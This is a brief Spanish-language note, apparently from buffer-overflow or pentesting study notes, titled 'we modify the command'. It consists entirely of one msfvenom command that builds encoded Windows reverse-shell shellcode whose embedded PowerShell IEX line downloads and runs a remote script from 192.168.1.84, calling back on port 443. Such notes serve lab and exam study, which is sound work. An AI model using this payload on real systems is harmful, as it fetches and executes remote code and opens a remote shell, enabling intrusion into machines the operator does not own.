___
- tags: #buffer_overflow #command #shell_code 
___
## Modificamos el comando
### msfvenom
```shell
# Añadimos CMD
msfvenom -p windows/shell_reverse_tcp CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.1.84/PS.ps1')" --platform windows -a x86 LHOST=192.168.1.84 LPORT=443 -f c -e x86/shikata_ga_nai EXITFUNC=thread -b '\x00\x0a\x0d'
```